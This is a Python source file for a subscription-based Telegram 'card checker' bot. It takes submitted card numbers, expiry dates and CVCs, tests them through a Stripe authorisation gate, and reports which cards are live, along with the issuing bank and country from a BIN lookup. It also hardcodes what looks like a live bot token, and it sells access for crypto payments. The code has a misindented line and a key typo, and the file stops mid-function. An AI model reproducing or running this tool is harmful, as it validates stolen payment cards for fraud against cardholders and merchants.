import telebot,os
import re,json
import requests
import telebot,time,random
import random
import string
from telebot import types
from gatet import *
from reg import reg
from datetime import datetime, timedelta
from faker import Faker
from multiprocessing import Process
import threading
from bs4 import BeautifulSoup
stopuser = {}

token = '7821261347:AAGKYtc2bBq5GODvvLsjcwouGj1ma7q9108'

bot=telebot.TeleBot(token,parse_mode="HTML")
admin=6440962840 #id ta
command_usage = {}
def reset_command_usage():
	for user_id in command_usage:
		command_usage[user_id] = {'count': 0, 'last_time': None}	
@bot.message_handler(commands=["start"])
def start(message):
	def my_function():
		gate=''
		name = message.from_user.first_name
		with open('data.json', 'r') as file:
			json_data = json.load(file)
		id=message.from_user.id
		
		try:BL=(json_data[str(id)]['plan'])
		except:
			BL='𝗙𝗥𝗘𝗘'
			with open('data.json', 'r') as json_file:
				existing_data = json.load(json_file)
			new_data = {
				id : {
	  "plan": "𝗙𝗥𝗘𝗘",
	  "timer": "none",
				}
			}
	
			existing_data.update(new_data)
			with open('data.json', 'w') as json_file:
				json.dump(existing_data, json_file, ensure_ascii=False, indent=4)
		if BL == '𝗙𝗥𝗘𝗘':	
			keyboard = types.InlineKeyboardMarkup()
			contact_button = types.InlineKeyboardButton(text="✨ 𝗢𝗪𝗡𝗘𝗥  ✨", url="http://t.me/Barry_op")
			keyboard.add(contact_button)
			random_number = random.randint(2, 37)
			photo_url = f'https://t.me/Barry_op/{random_number}'
			bot.send_photo(chat_id=message.chat.id, photo=photo_url, caption=f'''<b>Hello sir ({name}),
This Particular Bot is not Free
If you want use it, You must purchase a Weekly or Monthly Subscription

The Bots job is to Check Cards

Bot Subscription Price:
    
IRAQ ➜ Fast Pay - Korek
2 Days ➜ $1
3 Days ➜ $2
1 WEEK ➜ $5
1 MONTH ➜ $8

Worldwide ➜ USDT - LTC - Binance
2 Days ➜ $1
3 Days ➜ $2
1 WEEK ➜ $5
1 MONTH ➜ $8

Click to /cmds to view the commands

Your Plan now ({BL})</b>
	''',reply_markup=keyboard)
			return
		keyboard = types.InlineKeyboardMarkup()
		contact_button = types.InlineKeyboardButton(text="✨ 𝗝𝗢𝗜𝗡 ✨", url="https://t.me/Barry_op")
		keyboard.add(contact_button)
		username = message.from_user.first_name
		random_number = random.randint(2, 37)
		photo_url = f'https://t.me/Barry_op{random_number}'
		bot.send_photo(chat_id=message.chat.id, photo=photo_url, caption='''𝘾𝙡𝙞𝙘𝙠 /cmds 𝙏𝙤 𝙑𝙞𝙚𝙬 𝙏𝙝𝙚 𝘾𝙤𝙢𝙢𝙖𝙣𝙙𝙨 𝙊𝙧 𝙎𝙚𝙣𝙙 𝙏𝙝𝙚 𝙁𝙞𝙡𝙚 𝘼𝙣𝙙 𝙄 𝙒𝙞𝙡𝙡 𝘾𝙝𝙚𝙘𝙠 𝙄𝙩''',reply_markup=keyboard)
	my_thread = threading.Thread(target=my_function)
	my_thread.start()
@bot.message_handler(commands=["cmds"])
def start(message):
	with open('data.json', 'r') as file:
		json_data = json.load(file)
	id=message.from_user.id
	try:BL=(json_data[str(id)]['plan'])
	except:
		BL='𝗙𝗥𝗘𝗘'
	name = message.from_user.first_name
	keyboard = types.InlineKeyboardMarkup()
	contact_button = types.InlineKeyboardButton(text=f"✨ {BL}  ✨",callback_data='plan')
	keyboard.add(contact_button)
	bot.reply_to(message, text=f'''<b> 
𝗧𝗵𝗲𝘀𝗲 𝗔𝗿𝗲 𝗧𝗵𝗲 𝗕𝗼𝘁'𝗦 𝗖𝗼𝗺𝗺𝗮𝗻𝗱𝘀

𝗦𝘁𝗿𝗶𝗽𝗲 𝗔𝘂𝘁𝗵 <code>/chk </code> 𝗻𝘂𝗺𝗯𝗲𝗿|𝗺𝗺|𝘆𝘆|𝗰𝘃𝗰
𝗦𝗧𝗔𝗧𝗨𝗦 𝗢𝗡𝗟𝗜𝗡𝗘 

𝗪𝗲 𝗪𝗶𝗹𝗹 𝗕𝗲 𝗔𝗱𝗱𝗶𝗻𝗴 𝗦𝗼𝗺𝗲 𝗚𝗮𝘁𝗲𝘄𝗮𝘆𝘀 𝗔𝗻𝗱 𝗧𝗼𝗼𝗹𝘀 𝗦𝗼𝗼𝗻</b>
''',reply_markup=keyboard)
@bot.message_handler(content_types=["document"])
def main(message):
		name = message.from_user.first_name
		with open('data.json', 'r') as file:
			json_data = json.load(file)
		id=message.from_user.id
		
		try:BL=(json_data[str(id)]['plan'])
		except:
			BL='𝗙𝗥𝗘𝗘'
		if BL == '𝗙𝗥𝗘𝗘':
			with open('data.json', 'r') as json_file:
				existing_data = json.load(json_file)
			new_data = {
				id : {
	  "plan": "𝗙𝗥𝗘𝗘",
	  "timer": "none",
				}
			}
	
			existing_data.update(new_data)
			with open('data.json', 'w') as json_file:
				json.dump(existing_data, json_file, ensure_ascii=False, indent=4)	
			keyboard = types.InlineKeyboardMarkup()
			contact_button = types.InlineKeyboardButton(text="✨ 𝗢𝗪𝗡𝗘𝗥  ✨", url="https://t.me/Barry_op")
			keyboard.add(contact_button)
			bot.reply_to(message, text=f'''<b>Hello sir ({name}),
This Particular Bot is not Free
If you want use it, You must purchase a Weekly or Monthly Subscription

The Bots job is to Check Cards

Bot Subscription Price:
    
IRAQ ➜ Fast Pay - Korek
2 Days ➜ $1
3 Days ➜ $2
1 WEEK ➜ $5
1 MONTH ➜ $8

Worldwide ➜ USDT - LTC - Binance
2 Days ➜ $1
3 Days ➜ $2
1 WEEK ➜ $5
1 MONTH ➜ $8

Click to /cmds to view the commands

Your Plan now ({BL})</b>
''',reply_markup=keyboard)
			return
		with open('data.json', 'r') as file:
			json_data = json.load(file)
			date_str=json_data[str(id)]['timer'].split('.')[0]
		try:
			provided_time = datetime.strptime(date_str, "%Y-%m-%d %H:%M")
		except Exception as e:
			keyboard = types.InlineKeyboardMarkup()
			contact_button = types.InlineKeyboardButton(text="✨ 𝗢𝗪𝗡𝗘𝗥  ✨", url="https://t.me/Barry_op")
			keyboard.add(contact_button)
			bot.reply_to(message, text=f'''<b>Hello sir ({name}),
This Particular Bot is not Free
If you want use it, You must purchase a Weekly or Monthly Subscription

The Bots job is to Check Cards

Bot Subscription Price:
    
IRAQ ➜ Fast Pay - Korek
2 Days ➜ $1
3 Days ➜ $2
1 WEEK ➜ $5
1 MONTH ➜ $8

Worldwide ➜ USDT - LTC - Binance
2 Days ➜ $1
3 Days ➜ $2
1 WEEK ➜ $5
1 MONTH ➜ $8

Click to /cmds to view the commands

Your Plan now ({BL})</b>
''',reply_markup=keyboard)
			return
		current_time = datetime.now()
		required_duration = timedelta(hours=0)
		if current_time - provided_time > required_duration:
			keyboard = types.InlineKeyboardMarkup()
			contact_button = types.InlineKeyboardButton(text="✨ 𝗢𝗪𝗡𝗘𝗥  ✨", url="https://t.me/Barry_op")
			keyboard.add(contact_button)
			bot.send_message(chat_id=message.chat.id, text=f'''<b>𝙔𝙤𝙪 𝘾𝙖𝙣𝙣𝙤𝙩 𝙐𝙨𝙚 𝙏𝙝𝙚 𝘽𝙤𝙩 𝘽𝙚𝙘𝙖𝙪𝙨𝙚 𝙔𝙤𝙪𝙧 𝙎𝙪𝙗𝙨𝙘𝙧𝙞𝙥𝙩𝙞𝙤𝙣 𝙃𝙖𝙨 𝙀𝙭𝙥𝙞𝙧𝙚𝙙</b>
		''',reply_markup=keyboard)
			with open('data.json', 'r') as file:
				json_data = json.load(file)
			json_data[str(id)]['timer'] = 'none'
			json_data[str(id)]['paln'] = '𝗙𝗥𝗘𝗘'
			with open('data.json', 'w') as file:
				json.dump(json_data, file, indent=2)
			return
		keyboard = types.InlineKeyboardMarkup()
		contact_button = types.InlineKeyboardButton(text=f"️🏴‍☠️ 𝗦𝗧𝗥𝗜𝗣𝗘 𝗔𝗨𝗧𝗛 🏴‍☠️",callback_data='stppp')
		keyboard.add(contact_button)
		bot.reply_to(message, text=f'𝘾𝙝𝙤𝙤𝙨𝙚 𝙏𝙝𝙚 𝙂𝙖𝙩𝙚𝙬𝙖𝙮 𝙔𝙤𝙪 𝙒𝙖𝙣𝙩 𝙏𝙤 𝙐𝙨𝙚',reply_markup=keyboard)
		ee = bot.download_file(bot.get_file(message.document.file_id).file_path)
		with open("combo.txt", "wb") as w:
			w.write(ee)



@bot.callback_query_handler(func=lambda call: call.data == 'stppp')
def menu_callback(call):
	def my_function():
		id=call.from_user.id
		gate='𝗦𝗧𝗥𝗜𝗣𝗘 𝗔𝗨𝗧𝗛'
		dd = 0
		live = 0
		riskk = 0
		ccnn = 0
		bot.edit_message_text(chat_id=call.message.chat.id,message_id=call.message.message_id,text= "𝘾𝙝𝙚𝙘𝙠𝙞𝙣𝙜 𝙔𝙤𝙪𝙧 𝘾𝙖𝙧𝙙𝙨...⌛")
		try:
			with open("combo.txt", 'r') as file:
				lino = file.readlines()
				total = len(lino)
				try:
					stopuser[f'{id}']['status'] = 'start'
				except:
					stopuser[f'{id}'] = {
				'status': 'start'
			}
				for cc in lino:
					if stopuser[f'{id}']['status'] == 'stop':
						bot.edit_message_text(chat_id=call.chat.id, message_id=ko, text='𝗦𝗧𝗢𝗣𝗣𝗘𝗗 ✅\n𝗕𝗢𝗧 𝐠➜ @Barry_op')
						return
					try:
						data = requests.get('https://bins.antipublic.cc/bins/'+cc[:6]).json()
						
					except:
						pass
					try:
						bank=(data['bank'])
					except:
						bank=('𝒖𝒏𝒌𝒏𝒐𝒘𝒏')
					try:
						country_flag=(data['country_flag'])
					except:
						country_flag=('𝒖𝒏𝒌𝒏𝒐𝒘𝒏')
					try:
						country=(data['country_name'])
					except:
						country=('𝒖𝒏𝒌𝒏𝒐𝒘𝒏')
					try:
						brand=(data['brand'])
					except:
						brand=('𝒖𝒏𝒌𝒏𝒐𝒘𝒏')
					try:
						card_type=(data['type'])
					except:
						card_type=('𝒖𝒏𝒌𝒏𝒐𝒘𝒏')
					try:
						level=(data['level'])
					except:
						url=('𝒖𝒏𝒌𝒏𝒐𝒘𝒏')
					
					start_time = time.time()
					try:
						last = str(br(cc))
					except Exception as e:
						print(e)
						last = "ERROR"
					if 'risk' in last:
						last='declined'
					elif 'Duplicate' in last:
						last='Approved'
					mes = types.InlineKeyboardMarkup(row_width=1)
					cm1 = types.InlineKeyboardButton(f"• {cc} •", callback_data='u8')
					status = types.InlineKeyboardButton(f"• 𝙎𝙏𝘼𝙏𝙐𝙎 ➜ {last} •", callback_data='u8')
					cm3 = types.InlineKeyboardButton(f"• 𝘼𝙋𝙋𝙍𝙊𝙑𝙀𝘿 ✅ ➜ [ {live} ] •", callback_data='x')
					ccn = types.InlineKeyboardButton(f"• 𝘾𝘾𝙉 ☑️ ➜ [ {ccnn} ] •", callback_data='x')
					cm4 = types.InlineKeyboardButton(f"• 𝘿𝙀𝘾𝙇𝙄𝙉𝙀𝘿 ❌ ➜ [ {dd} ] •", callback_data='x')
					risk = types.InlineKeyboardButton(f"• 3DSCUR 🏴‍☠️ ➜ [ {riskk} ] •", callback_data='x')
					cm5 = types.InlineKeyboardButton(f"• 𝙏𝙊𝙏𝘼𝙇 👻 ➜ [ {total} ] •", callback_data='x')
					stop=types.InlineKeyboardButton(f"[ 𝙎𝙏𝙊𝙋 ]", callback_data='stop')
					mes.add(cm1,status, cm3,ccn,risk, cm4, cm5, stop)
					end_time = time.time()
					execution_time = end_time - start_time
					bot.edit_message_text(chat_id=call.message.chat.id, 
					  message_id=call.message.message_id, 
					  text=f'''𝙋𝙡𝙚𝙖𝙨𝙚 𝙒𝙖𝙞𝙩 𝙒𝙝𝙞𝙡𝙚 𝙔𝙤𝙪𝙧 𝘾𝙖𝙧𝙙𝙨 𝘼𝙧𝙚 𝘽𝙚𝙞𝙣𝙜 𝘾𝙝𝙚𝙘𝙠 𝘼𝙩 𝙏𝙝𝙚 𝙂𝙖𝙩𝙚𝙬𝙖𝙮 {gate}
𝘽𝙤𝙩 𝘽𝙮 @Barry_op''', reply_markup=mes)
					
					msg=f'''<b>𝘼𝙥𝙥𝙧𝙤𝙫𝙚𝙙 ✅
			
𝘾𝙖𝙧𝙙 ➼ <code>{cc}</code>
𝙍𝙚𝙨𝙥𝙤𝙣𝙨𝙚 ➼ {last}
𝙂𝙖𝙩𝙚𝙬𝙖𝙮 ➼ {gate}		
𝙄𝙣𝙛𝙤 ➼ {brand} - {card_type} - {level}
𝘾𝙤𝙪𝙣𝙩𝙧𝙮 ➼ {country} - {country_flag} 
𝙄𝙨𝙨𝙪𝙚𝙧 ➼ {bank}
𝘽𝙞𝙣 ➼ {cc[:6]}
𝙏𝙞𝙢𝙚 ➼ {"{:.1f}".format(execution_time)}
𝗕𝗼𝘁 𝗕𝘆: @Barry_op</b>'''
					if "Thank You" in last or 'Invalid postal' in last or 'Payment method successfully added' in last or 'Nice! New payment method added' in last or 'success' in last or 'Approved' in last or 'Thank you' in last:
						live += 1
						bot.send_message(call.from_user.id, msg)
					elif 'requires_action' in last:
						risk+=1
					elif 'Insufficient Funds' in last:
						mmsg=f'''<b>𝘾𝘾𝙉 ☑️
			
𝘾𝙖𝙧𝙙 ➼ <code>{cc}</code>
𝙍𝙚𝙨𝙥𝙤𝙣𝙨𝙚 ➼ {last}
𝙂𝙖𝙩𝙚𝙬𝙖𝙮 ➼ {gate}		
𝙄𝙣𝙛𝙤 ➼ {brand} - {card_type} - {level}
𝘾𝙤𝙪𝙣𝙩𝙧𝙮 ➼ {country} - {country_flag} 
𝙄𝙨𝙨𝙪𝙚𝙧 ➼ {bank}
𝘽𝙞𝙣 ➼ {cc[:6]}
𝙏𝙞𝙢𝙚 ➼ {"{:.1f}".format(execution_time)}
𝗕𝗼𝘁 𝗕𝘆: @Barry_op</b>'''
						bot.send_message(call.from_user.id, mmsg)
						ccnn+=1
					else:
						dd += 1
					time.sleep(4)
		except Exception as e:
			print(e)
		stopuser[f'{id}']['status'] = 'start'
		bot.edit_message_text(chat_id=call.message.chat.id, 
					  message_id=call.message.message_id, 
					  text='𝗕𝗘𝗘𝗡 𝗖𝗢𝗠𝗣𝗟𝗘𝗧𝗘𝗗 ✅\n𝗕𝗢𝗧 𝗕𝗬 ➜ @Barry_op')
	my_thread = threading.Thread(target=my_function)
	my_thread.start()
	
	
	
@bot.message_handler(func=lambda message: message.text.lower().startswith('.chk') or message.text.lower().startswith('/chk'))
def respond_to_vbv(message):
	gate='𝗦𝗧𝗥𝗜𝗣𝗘 𝗔𝗨𝗧𝗛 '
	name = message.from_user.first_name
	idt=message.from_user.id
	id=message.chat.id
	with open('data.json', 'r') as json_file:
		json_data = json.load(json_file)

	try:BL=(json_data[str(idt)]['plan'])
	except:
		with open('data.json', 'r') as json_file:
			existing_data = json.load(json_file)
		new_data = {
			id : {
  "plan": "𝗙𝗥𝗘𝗘",
  "timer": "none",
			}
		}
		existing_data.update(new_data)
		with open('data.json', 'w') as json_file:
			json.dump(existing_data, json_file, ensure_ascii=False, indent=4)	
		BL='𝗙𝗥𝗘𝗘'
	if BL == '𝗙𝗥𝗘𝗘':
		keyboard = types.InlineKeyboardMarkup()
		contact_button = types.InlineKeyboardButton(text="✨ 𝗢𝗪𝗡𝗘𝗥  ✨", url="https://t.me/Barry_op")
		keyboard.add(contact_button)
		bot.reply_to(message, text=f'''<b>Hello sir ({name}),
This Particular Bot is not Free
If you want use it, You must purchase a Weekly or Monthly Subscription

The Bots job is to Check Cards

Bot Subscription Price:
    
IRAQ ➜ Fast Pay - Korek
2 Days ➜ $1
3 Days ➜ $2
1 WEEK ➜ $5
1 MONTH ➜ $8

Worldwide ➜ USDT - LTC - Binance
2 Days ➜ $1
3 Days ➜ $2
1 WEEK ➜ $5
1 MONTH ➜ $8

Click to /cmds to view the commands

Your Plan now ({BL})</b>
''',reply_markup=keyboard)
		return
	with open('data.json', 'r') as file:
		json_data = json.load(file)
		date_str=json_data[str(id)]['timer'].split('.')[0]
	try:
		provided_time = datetime.strptime(date_str, "%Y-%m-%d %H:%M")
	except Exception as e:
		keyboard = types.InlineKeyboardMarkup()
		contact_button = types.InlineKeyboardButton(text="✨ 𝗢𝗪𝗡𝗘𝗥  ✨", url="https://t.me/Barry_op")
		keyboard.add(contact_button)
		bot.reply_to(message, text=f'''<b>Hello sir ({name}),
This Particular Bot is not Free
If you want use it, You must purchase a Weekly or Monthly Subscription

The Bots job is to Check Cards

Bot Subscription Price:
    
IRAQ ➜ Fast Pay - Korek
2 Days ➜ $1
3 Days ➜ $2
1 WEEK ➜ $5
1 MONTH ➜ $8

Worldwide ➜ USDT - LTC - Binance
2 Days ➜ $1
3 Days ➜ $2
1 WEEK ➜ $5
1 MONTH ➜ $8

Click to /cmds to view the commands

Your Plan now ({BL})</b>
''',reply_markup=keyboard)
		return
	current_time = datetime.now()
	required_duration = timedelta(hours=0)
	if current_time - provided_time > required_duration:
		keyboard = types.InlineKeyboardMarkup()
		contact_button = types.InlineKeyboardButton(text="✨ 𝗢𝗪𝗡𝗘𝗥  ✨", url="https://t.me/Barry_op")
		keyboard.add(contact_button)
		bot.reply_to(message, text=f'''<b>𝙔𝙤𝙪 𝘾𝙖𝙣𝙣𝙤𝙩 𝙐𝙨𝙚 𝙏𝙝𝙚 𝘽𝙤𝙩 𝘽𝙚𝙘𝙖𝙪𝙨𝙚 𝙔𝙤𝙪𝙧 𝙎𝙪𝙗𝙨𝙘𝙧𝙞𝙥𝙩𝙞𝙤𝙣 𝙃𝙖𝙨 𝙀𝙭𝙥𝙞𝙧𝙚𝙙</b>
	''',reply_markup=keyboard)
		with open('data.json', 'r') as file:
			json_data = json.load(file)
		json_data[str(id)]['timer'] = 'none'
		json_data[str(id)]['paln'] = '𝗙𝗥𝗘𝗘'
		with open('data.json', 'w') as file:
			json.dump(json_data, file, indent=2)
		return
	try:command_usage[idt]['last_time']
	except:command_usage[idt] = {
				'last_time': datetime.now()
			}
	if command_usage[idt]['last_time'] is not None:
		time_diff = (current_time - command_usage[idt]['last_time']).seconds
		if time_diff < 30:
			bot.reply_to(message, f"<b>Try again after {30-time_diff} seconds.</b>",parse_mode="HTML")
			return	
	ko = (bot.reply_to(message, "𝘾𝙝𝙚𝙘𝙠𝙞𝙣𝙜 𝙔𝙤𝙪𝙧 𝘾𝙖𝙧𝙙𝙨...⌛").message_id)
	try:
		cc = message.reply_to_message.text
	except:
		cc=message.text
	cc=str(reg(cc))
	if cc == 'None':
		bot.edit_message_text(chat_id=message.chat.id, message_id=ko, text='''<b>🚫 Oops!
Please ensure you enter the card details in the correct format:
Card: XXXXXXXXXXXXXXXX|MM|YYYY|CVV</b>''',parse_mode="HTML")
		return
	start_time = time.time()
	try:
		command_usage[idt]['last_time'] = datetime.now()
		last = str(br(cc))
	except Exception as e:
		last='Error'
	try: data = requests.get('https://bins.antipublic.cc/bins/'+cc[:6]).json()
	except: pass
	try:
		brand = data['brand']
	except:
		brand = 'Unknown'
	try:
		card_type = data['type']
	except:
		card_type = 'Unknown'
	try:
		country = data['country_name']
		country_flag = data['country_flag']
	except:
		country = 'Unknown'
		country_flag = 'Unknown'
	try:
		bank = data['bank']
	except:
		bank = 'Unknown'
	try:
		level = data['level']
	except:
		level = 'Unknown'
	end_time = time.time()
	execution_time = end_time - start_time
	msg=f'''<b>𝘼𝙥𝙥𝙧𝙤𝙫𝙚𝙙 ✅
			
𝘾𝙖𝙧𝙙 ➼ <code>{cc}</code>
𝙍𝙚𝙨𝙥𝙤𝙣𝙨𝙚 ➼ {last}
𝙂𝙖𝙩𝙚𝙬𝙖𝙮 ➼ {gate}		
𝙄𝙣𝙛𝙤 ➼ {brand} - {card_type} - {level}
𝘾𝙤𝙪𝙣𝙩𝙧𝙮 ➼ {country} - {country_flag} 
𝙄𝙨𝙨𝙪𝙚𝙧 ➼ {bank}
𝘽𝙞𝙣 ➼ {cc[:6]}
𝙏𝙞𝙢𝙚 ➼ {"{:.1f}".format(execution_time)}
𝗕𝗼𝘁 𝗕𝘆: @Barry_op</b>'''
	msgd=f'''<b>𝘿𝙚𝙘𝙡𝙞𝙣𝙚𝙙 ❌
			
𝘾𝙖𝙧𝙙 ➼ <code>{cc}</code>
𝙍𝙚𝙨𝙥𝙤𝙣𝙨𝙚 ➼ {last}
𝙂𝙖𝙩𝙚𝙬𝙖𝙮 ➼ {gate}		
𝙄𝙣𝙛𝙤 ➼ {brand} - {card_type} - {level}
𝘾𝙤𝙪𝙣𝙩𝙧𝙮 ➼ {country} - {country_flag} 
𝙄𝙨𝙨𝙪𝙚𝙧 ➼ {bank}
𝘽𝙞𝙣 ➼ {cc[:6]}
𝙏𝙞𝙢𝙚 ➼ {"{:.1f}".format(execution_time)}
𝗕𝗼𝘁 𝗕𝘆: @Barry_op</b>'''
	mmsg=f'''<b>𝘾𝘾𝙉 ☑️
			
𝘾𝙖𝙧𝙙 ➼ <code>{cc}</code>
𝙍𝙚𝙨𝙥𝙤𝙣𝙨𝙚 ➼ {last}
𝙂𝙖𝙩𝙚𝙬𝙖𝙮 ➼ {gate}		
𝙄𝙣𝙛𝙤 ➼ {brand} - {card_type} - {level}
𝘾𝙤𝙪𝙣𝙩𝙧𝙮 ➼ {country} - {country_flag} 
𝙄𝙨𝙨𝙪𝙚𝙧 ➼ {bank}
𝘽𝙞𝙣 ➼ {cc[:6]}
𝙏𝙞𝙢𝙚 ➼ {"{:.1f}".format(execution_time)}
𝗕𝗼𝘁 𝗕𝘆: @Barry_op</b>'''
	mscur=f'''<b>3D ☑️
			
𝘾𝙖𝙧𝙙 ➼ <code>{cc}</code>
𝙍𝙚𝙨𝙥𝙤𝙣𝙨𝙚 ➼ {last}
𝙂𝙖𝙩𝙚𝙬𝙖𝙮 ➼ {gate}		
𝙄𝙣𝙛𝙤 ➼ {brand} - {card_type} - {level}
𝘾𝙤𝙪𝙣𝙩𝙧𝙮 ➼ {country} - {country_flag} 
𝙄𝙨𝙨𝙪𝙚𝙧 ➼ {bank}
𝘽𝙞𝙣 ➼ {cc[:6]}
𝙏𝙞𝙢𝙚 ➼ {"{:.1f}".format(execution_time)}
𝗕𝗼𝘁 𝗕𝘆: @Barry_op</b>'''
	if "Payment method successfully added" in last or 'Invalid postal' in last or 'Thank you' in last or 'Nice! New payment method added' in last or 'success' in last or 'Approved' in last:
		bot.edit_message_text(chat_id=message.chat.id, message_id=ko, text=msg)
	elif 'Insufficient Funds' in last:
	    bot.edit_message_text(chat_id=message.chat.id, message_id=ko, text=mmsg)
	elif 'requires_action' in last:
	    bot.edit_message_text(chat_id=message.chat.id, message_id=ko, text=mscur)
	    
	else:
		bot.edit_message_text(chat_id=message.chat.id, message_id=ko, text=msgd)
		


@bot.message_handler(func=lambda message: message.text.lower().startswith('.bin') or message.text.lower().startswith('/bin'))
def respond_to_vbv(message):
	cc = message.text
	
	ccc = cc[:11]
	cccc = ccc.split('/bin ')[1]
	
	data = requests.get('https://bins.antipublic.cc/bins/'+cccc).json()
	#except: pass
	try:
		brand = data['brand']
	except:
		brand = 'Unknown'
	try:
		card_type = data['type']
	except:
		card_type = 'Unknown'
	try:
		country = data['country_name']
		country_flag = data['country_flag']
	except:
		country = 'Unknown'
		country_flag = 'Unknown'
	try:
		bank = data['bank']
	except:
		bank = 'Unknown'
	try:
		level = data['level']
	except:
		level = 'Unknown'
		
	msg=f'''<b>𝗩𝗮𝗹𝗶𝗱 𝗕𝗜𝗡 ✅
	
𝗕𝗜𝗡 -» <code>{cccc}</code>
	
𝗕𝗶𝗻 𝗶𝗻𝗳𝗼 -» {brand} - {card_type} - {level}
𝗕𝗮𝗻𝗸 -» {bank}
𝗖𝗼𝘂𝗻𝘁𝗿𝘆 -» {country} {country_flag}
</b>'''
	
	bot.reply_to(message,msg,parse_mode="HTML")
	


@bot.message_handler(func=lambda message: message.text.lower().startswith('.redeem') or message.text.lower().startswith('/redeem'))
def respond_to_vbv(message):
	def my_function():
		global stop
		try:
			re=message.text.split(' ')[1]
			with open('data.json', 'r') as file:
				json_data = json.load(file)
			timer=(json_data[re]['time'])
			typ=(json_data[f"{re}"]["plan"])
			json_data[f"{message.from_user.id}"]['timer'] = timer
			json_data[f"{message.from_user.id}"]['plan'] = typ
			with open('data.json', 'w') as file:
				json.dump(json_data, file, indent=2)
			with open('data.json', 'r') as json_file:
				data = json.load(json_file)
			del data[re]
			with open('data.json', 'w') as json_file:
				json.dump(data, json_file, ensure_ascii=False, indent=4)
			msg=f'''<b>BARRY OP 𝗩𝗜𝗣 𝗦𝗨𝗕𝗦𝗖𝗥𝗜𝗕𝗘𝗗 ✅
𝗦𝗨𝗕𝗦𝗖𝗥𝗜𝗣𝗧𝗜𝗢𝗡 𝗘𝗫𝗣𝗜𝗥𝗘𝗦 𝗜𝗡 ➜ {timer}
𝗣𝗟𝗔𝗡 ➜ {typ}</b>'''
			bot.reply_to(message,msg,parse_mode="HTML")
		except Exception as e:
			print('ERROR : ',e)
			bot.reply_to(message,'<b>Incorrect code or it has already been redeemed </b>',parse_mode="HTML")
	my_thread = threading.Thread(target=my_function)
	my_thread.start()
@bot.message_handler(commands=["code"])
def start(message):
	def my_function():
		id=message.from_user.id
		if not id ==admin:
			return
		try:
			h=float(message.text.split(' ')[1])
			with open('data.json', 'r') as json_file:
				existing_data = json.load(json_file)
			characters = string.ascii_uppercase + string.digits
			pas ='BARRY-'+''.join(random.choices(characters, k=4))+'-'+''.join(random.choices(characters, k=4))+'-'+''.join(random.choices(characters, k=4))
			current_time = datetime.now()
			ig = current_time + timedelta(hours=h)
			plan='𝗩𝗜𝗣'
			parts = str(ig).split(':')
			ig = ':'.join(parts[:2])
			with open('data.json', 'r') as json_file:
				existing_data = json.load(json_file)
			new_data = {
				pas : {
	  "plan": plan,
	  "time": ig,
			}
			}
			existing_data.update(new_data)
			 with open('data.json', 'w') as json_file:
				json.dump(existing_data, json_file, ensure_ascii=False, indent=4)	
			msg=f'''<b>𝗡𝗘𝗪 𝗞𝗘𝗬 𝗖𝗥𝗘𝗔𝗧𝗘𝗗 🚀
		
𝗣𝗟𝗔𝗡 ➜ {plan}
𝗘𝗫𝗣𝗜𝗥𝗘𝗦 𝗜𝗡 ➜ {ig}
𝗞𝗘𝗬 ➜ <code>{pas}</code>
		
𝗨𝗦𝗘 /redeem [𝗞𝗘𝗬]</b>'''
			bot.reply_to(message,msg,parse_mode="HTML")
		except Exception as e:
			print('ERROR : ',e)
			bot.reply_to(message,e,parse_mode="HTML")
	my_thread = threading.Thread(target=my_function)
	my_thread.start()
@bot.message_handler(func=lambda message: message.text.lower().startswith('.vbv') or message.text.lower().startswith('/vbv'))
def respond_to_vbv(message):
	id=message.from_user.id
	name = message.from_user.first_name
	gate='3𝑫𝑺 𝑳𝒐𝒐𝒌𝒖𝒑'
	with open('data.json', 'r') as file:
		json_data = json.load(file)
	try:BL=(json_data[str(id)]['plan'])
	except:
		with open('data.json', 'r') as json_file:
			existing_data = json.load(json_file)
		new_data = {
			id : {
  "plan": "𝗙𝗥𝗘𝗘",
  "timer": "none",
			}
		}
		BL='𝗙𝗥𝗘𝗘'
		existing_data.update(new_data)
		with open('data.json', 'w') as json_file:
			json.dump(existing_data, json_file, ensure_ascii=False, indent=4)	
	if BL == '𝗙𝗥𝗘𝗘':
		keyboard = types.InlineKeyboardMarkup()
		contact_button = types.InlineKeyboardButton(text="✨ 𝗢𝗪𝗡𝗘𝗥  ✨", url="https://t.me/Barry_op")
		keyboard.add(contact_button)
		bot.reply_to(message, text=f'''<b>Hello sir ({name}),
This Particular Bot is not Free
If you want use it, You must purchase a Weekly or Monthly Subscription

The Bots job is to Check Cards

Bot Subscription Price:
   
IRAQ ➜ Fast Pay - Korek
2 Days ➜ $1
3 Days ➜ $2
1 WEEK ➜ $5
1 MONTH ➜ $8

Worldwide ➜ USDT - LTC - Binance
2 Days ➜ $1
3 Days ➜ $2
1 WEEK ➜ $5
1 MONTH ➜ $8

Click to /cmds to view the commands

Your Plan now ({BL})</b>
''',reply_markup=keyboard)
		return
	with open('data.json', 'r') as file:
		json_data = json.load(file)
		date_str=json_data[str(id)]['timer'].split('.')[0]
	try:
		provided_time = datetime.strptime(date_str, "%Y-%m-%d %H:%M")
	except Exception as e:
		keyboard = types.InlineKeyboardMarkup()
		contact_button = types.InlineKeyboardButton(text="✨ 𝗢𝗪𝗡𝗘𝗥  ✨", url="https://t.me/Barry_op")
		keyboard.add(contact_button)
		bot.reply_to(message, text=f'''<b>Hello sir ({name}),
This Particular Bot is not Free
If you want use it, You must purchase a Weekly or Monthly Subscription

The Bots job is to Check Cards

Bot Subscription Price:
    
IRAQ ➜ Fast Pay - Korek
2 Days ➜ $1
3 Days ➜ $2
1 WEEK ➜ $5
1 MONTH ➜ $8

Worldwide ➜ USDT - LTC - Binance
2 Days ➜ $1
3 Days ➜ $2
1 WEEK ➜ $5
1 MONTH ➜ $8

Click to /cmds to view the commands

Your Plan now ({BL})</b>
''',reply_markup=keyboard)
		return
	current_time = datetime.now()
	required_duration = timedelta(hours=0)
	if current_time - provided_time > required_duration:
		keyboard = types.InlineKeyboardMarkup()
		contact_button = types.InlineKeyboardButton(text="✨ 𝗢𝗪𝗡𝗘𝗥  ✨", url="https://t.me/Barry_op")
		keyboard.add(contact_button)
		bot.send_message(chat_id=message.chat.id, text=f'''<b>𝙔𝙤𝙪 𝘾𝙖𝙣𝙣𝙤𝙩 𝙐𝙨𝙚 𝙏𝙝𝙚 𝘽𝙤𝙩 𝘽𝙚𝙘𝙖𝙪𝙨𝙚 𝙔𝙤𝙪𝙧 𝙎𝙪𝙗𝙨𝙘𝙧𝙞𝙥𝙩𝙞𝙤𝙣 𝙃𝙖𝙨 𝙀𝙭𝙥𝙞𝙧𝙚𝙙</b>
	''',reply_markup=keyboard)
		with open('data.json', 'r') as file:
			json_data = json.load(file)
		json_data[str(id)]['timer'] = 'none'
		json_data[str(id)]['paln'] = '𝗙𝗥𝗘𝗘'
